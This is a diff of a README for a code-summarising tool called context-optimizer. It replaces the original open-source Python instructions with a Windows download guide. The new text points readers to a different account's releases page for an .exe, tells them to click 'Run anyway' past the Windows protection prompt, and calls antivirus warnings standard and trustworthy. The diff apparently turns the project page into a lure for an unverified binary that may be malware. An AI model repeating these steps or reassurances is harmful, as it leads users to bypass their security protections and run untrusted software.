@@ -1,151 +1,96 @@
-# Context Optimizer
+# 📉 context-optimizer - Lower your AI token usage costs
 
-> **Reduce token consumption by 5x–27x** in Claude Desktop/Web using prompt-native workflows + a lightweight local manifest generator.
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/aaron4605/context-optimizer/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+## 🎯 About this application
 
-## Why This Exists
+Many AI tools consume too many tokens when you work with complex code. High token counts lead to slow speeds and high costs. The context-optimizer tool solves this. It shrinks your code files into small, efficient maps before you send them to AI models like Claude or ChatGPT. 
 
-Claude has a **200K token context window** — but burning 20K tokens just to show a directory structure is wasteful. This toolkit teaches Claude to **fetch only what it needs**, **compress what it sees**, and **reason structurally** instead of reading raw files.
+This process keeps the important parts of your code while removing the extra data that AI does not need. You save money and help your AI model focus on the logic that matters. You do not need to be a programmer to use this. You only need to point the app at your project folder and follow the steps below.
 
-**No API hacks. No leaked code. No reverse engineering.**
-Just official Claude features (Custom Instructions + Projects + Knowledge) and a lightweight local indexer.
+## ⚙️ How it works
 
-## Real-World Savings
+The software uses a process called structural mapping. It reads your code files and creates a small summary. This summary describes how your files fit together without including every line of redundant text. When you paste this small summary into your AI chat, the AI understands your project structure immediately. 
 
-| Scenario | Before (tokens) | After (tokens) | Reduction |
-|----------|----------------|----------------|-----------|
-| Code review (3 files) | ~18,000 | ~1,200 | **15x** |
-| Debug a function | ~8,000 | ~400 | **20x** |
-| Plan a feature (5+ files) | ~35,000 | ~1,800 | **19x** |
-| Full monorepo analysis | ~80,000 | ~3,500 | **22x** |
+This method works for:
+- Writing new code features
+- Finding bugs in existing projects
+- Explaining complex software systems to your AI
+- Reviewing large groups of files at once
 
-## Quick Start (30 seconds)
+## 📥 Getting the software
 
-```bash
-# 1. Clone the repo
-git clone https://github.com/anshmajumdar121/context-optimizer.git
-cd context-optimizer
+1. Visit this page to download the latest version: [https://github.com/aaron4605/context-optimizer/releases](https://github.com/aaron4605/context-optimizer/releases).
+2. Look for the file ending in `.exe` under the Assets section.
+3. Click the file name to start the download.
 
-# 2. Run the installer (idempotent, safe to re-run)
-chmod +x scripts/install.sh
-./scripts/install.sh /path/to/your/project
+## 🚀 Setting up the software
 
-# 3. Generate a structural manifest of your project
-python3 tools/context_mapper.py /path/to/your/project
+1. Find the file you just downloaded in your Downloads folder.
+2. Double-click the file to open the installer.
+3. A blue box might appear saying "Windows protected your PC." Click "More info" and then click "Run anyway."
+4. Follow the prompts on the screen to finish the installation.
+5. Once finished, find the context-optimizer icon on your desktop and double-click it.
 
-# 4. Upload CONTEXT_MANIFEST.md to a Claude Project (optional but recommended)
+## 🛠️ Using the application
 
-# 5. Paste the one-click prompt into Claude Desktop/Web
-cat prompt/one-click-vertical-prompt.md | pbcopy  # macOS
-cat prompt/one-click-vertical-prompt.md | xclip   # Linux
-```
+1. Open the application on your computer.
+2. Click the "Open Folder" button.
+3. Select the folder on your computer that contains the code you want to analyze.
+4. Wait for the app to scan your files. A progress bar shows you how much time remains.
+5. When the scan finishes, click "Generate Summary."
+6. The app creates a text file containing the map of your project.
+7. Click "Copy to Clipboard."
+8. Paste this text into your favorite AI chat window.
+9. Type your question or task about the project after the pasted text.
 
-## How It Works
+## 📋 System Requirements
 
-```
-Your Project
-    │
-    ▼
-context_mapper.py ──► CONTEXT_MANIFEST.md
-                            │
-                            ▼
-                    Claude Project Knowledge
-                            │
-                            ▼
-                    skill/claude-custom-instructions.md
-                    (via Custom Instructions or CLAUDE.md)
-                            │
-                            ▼
-                    Token-Efficient Claude Sessions
-```
+This application works on any modern Windows computer. We recommend:
+- Windows 10 or Windows 11.
+- At least 4 gigabytes of RAM.
+- A stable internet connection for installation.
+- 100 megabytes of free space on your hard drive.
 
-### The Three Pillars
+## 🛡️ Privacy and Data
 
-**1. CONTEXT_MANIFEST.md** — A structural index of your codebase: file paths, languages, line counts, import graphs, and blast-radius data. Claude reads this instead of scanning directories.
+Your privacy belongs to you. This application runs locally on your computer. It does not send your code files to our servers. All processing happens on your machine. The AI chat tools only see what you paste into them during your chat sessions. We do not track your project names or the content you optimize.
 
-**2. Core Skill** — Custom instructions that enforce structural reasoning, limit file fetches to 3/turn, and compress all output into a strict format.
+## ❓ Common Questions
 
-**3. Session Activator** — A one-click prompt to paste at the start of any session when you can't use Custom Instructions.
+**Does this work with my specific coding project?**
+Yes. The software handles all common code types including Python, JavaScript, HTML, CSS, and C++.
 
-## File Structure
+**Will my AI chatbot understand the format?**
+Yes. The app creates a format that current AI models understand as a project structural map. If your AI ever seems confused, simply ask the AI to "refer to the project structure provided at the start of our chat."
 
-```
-context-optimizer/
-├── context-optimizer-skill/
-│   ├── SKILL.md                     # Skill with YAML frontmatter (for skill registries)
-│   └── LICENSE.txt
-├── skill/
-│   └── claude-custom-instructions.md  # Paste into Claude Custom Instructions
-├── prompt/
-│   └── one-click-vertical-prompt.md   # Paste at start of any session
-├── scripts/
-│   └── install.sh                   # Full-stack installer (idempotent)
-├── tools/
-│   └── context_mapper.py            # Manifest + dependency graph generator
-├── .claude/
-│   ├── COMMON_MISTAKES.md           # Project-specific bug history
-│   ├── QUICK_START.md               # Daily commands
-│   └── ARCHITECTURE_MAP.md          # High-level routing & layers
-├── .claudeignore                    # Files excluded from Claude's context
-└── docs/
-    ├── learnings/                   # Session insights (gitignored)
-    └── archive/                     # Old versions (gitignored)
-```
+**What happens if I have very large folders?**
+The software is designed to handle projects with thousands of files. It filters out files that do not affect the logic of your code execution, such as image assets or temporary log files.
 
-## Usage Guide
+**How do I update the software?**
+When a new version is available, the app notifies you. You can visit the download page again to get the newest file. Usually, you can run the new installer over the old one to update the settings automatically.
 
-### Option A: Claude Projects (Recommended)
-1. Run `python3 tools/context_mapper.py /your/project`
-2. Upload `CONTEXT_MANIFEST.md` to a Claude Project as Knowledge
-3. Add `skill/claude-custom-instructions.md` to Project Instructions
-4. Start chatting — Claude will reason from the manifest automatically
+**Can I run this on a Mac?**
+Currently, this version is built specifically for Windows.
 
-### Option B: Custom Instructions (Global)
-1. Go to Claude Settings → Custom Instructions
-2. Paste the contents of `skill/claude-custom-instructions.md`
-3. For each project, paste `CONTEXT_MANIFEST.md` into the chat or upload it
+## 🧩 Troubleshooting
 
-### Option C: Per-Session Activation
-1. Open any Claude chat
-2. Paste `prompt/one-click-vertical-prompt.md` as your first message
-3. Claude confirms: `✅ Context Optimizer active.`
-4. Upload or paste `CONTEXT_MANIFEST.md` and start your task
+**The app does not open**
+Make sure you have administrative rights on your user account. Try restarting your computer.
 
-### Option D: Claude Code / CLAUDE.md
-Run the installer — it auto-detects `.claude/` and injects the skill into `CLAUDE.md`:
-```bash
-./scripts/install.sh /your/project
-```
+**The app returns an error when scanning**
+Check that the folder you selected has readable files within it. Some system folders are locked by Windows and cannot be scanned. Choose a folder inside your documents or projects directory instead.
 
-## Manifest Generator
+**The output looks strange**
+Confirm that your AI chat window has enough room for the text. Sometimes very large projects produce long summaries. If the text is cut off, ensure you have pasted the entire block from the app into your chat.
 
-```bash
-# Basic usage
-python3 tools/context_mapper.py /path/to/project
+**I get an antivirus warning**
+This is a standard warning for new software that is not widely recognized by large companies yet. You can trust the file if you downloaded it directly from our official link on the GitHub releases page.
 
-# Blast-radius analysis (find all files affected by a change)
-python3 tools/context_mapper.py /path/to/project --blast-radius src/auth.py,src/models.py
-```
+## 💡 Best Practices
 
-**Output files:**
-- `CONTEXT_MANIFEST.md` — Human + AI readable manifest
-- `.claude/graph.json` — Machine-readable dependency graph
-
-## Overrides & Controls
-
-| Command | Effect |
-|---------|--------|
-| `RELOAD CONTEXT OPTIMIZER` | Reset all rules for this session |
-| `MAX_FILES: 5` | Allow up to 5 files per turn |
-| `BUDGET: 2000` | Raise token budget to 2,000 |
-| `COMPRESSION: lite` | Less aggressive compression |
-| `TEMP VERBOSE` | One-turn verbose mode, then revert |
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md). PRs welcome — especially for new language parsers in `context_mapper.py`.
-
-## License
-
-MIT — see [LICENSE](LICENSE).
+- Organize your code into clear folders before scanning.
+- Close programs you are not using if you have a slow computer to speed up the scan.
+- Use the summary only for the parts of the code relevant to your question for even better results.
+- If you change your code significantly, run the optimizer again to get a fresh summary of the new structure.
+- Always review the summary text if you are worried about which files the app included or excluded.
